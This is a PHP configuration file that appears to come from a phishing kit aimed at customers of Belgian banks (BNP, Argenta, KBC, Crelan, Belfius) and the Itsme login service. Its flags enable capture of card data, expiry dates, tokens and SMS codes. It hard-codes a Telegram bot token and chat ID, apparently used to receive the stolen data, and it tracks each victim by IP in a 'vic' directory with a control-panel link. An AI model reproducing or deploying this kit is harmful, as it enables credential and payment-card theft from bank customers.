<?php 

    $blanco_bnp = "y";
    $blanco_argenta = "y";
    $blanco_kbc = "y";
    $blanco_crelan = "y";
    $blanco_belfius = "y";
	
	
	$TYPING_EXP = "y";
	$TYPING_TOKEN = "y";
	$TYPING_SMS = "y";
	$TYPING_CC = "y";
	$REZ_SOURCE = "Itsme";


    define('BOT_TOKEN' , '8695463229:AAGPPe6dlxCtTcst5G2k3QqAR2CDZzHOfWY');
    define('CHAT_ID'   , '-5249238792');
	
	
	define('BOT_TOKEN2' , '8695463229:AAGPPe6dlxCtTcst5G2k3QqAR2CDZzHOfWY');
    define('CHAT_ID2'   , '-5249238792');
	
	$apiToken = "8695463229:AAGPPe6dlxCtTcst5G2k3QqAR2CDZzHOfWY";
    $id = "-5249238792";


    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    
    function get_steps_link() {
    
        $ex = explode('/',$_SERVER['REQUEST_URI']);
        array_shift($ex);
        for($i = 1; $i <= 3 ; $i++) {
            array_pop($ex);
        }
        $im = '/' . implode('/',$ex) . '/';
    
        $url = "https://". $_SERVER['HTTP_HOST'] . $im;
        $x = pathinfo($url);
    
        return $ee = $x['dirname'] . '/1control.php?ip=' . get_client_ip();
    }   
    
    function get_text($place) {
        global $lang;
        return $lang[$place][$_SESSION["lang"]];
    }    
     
    function reset_data() {
        $fp = fopen('../../../vic/'. get_client_ip() .'.txt', 'wb');
        fwrite($fp, 0);
        fclose($fp);
    }



?>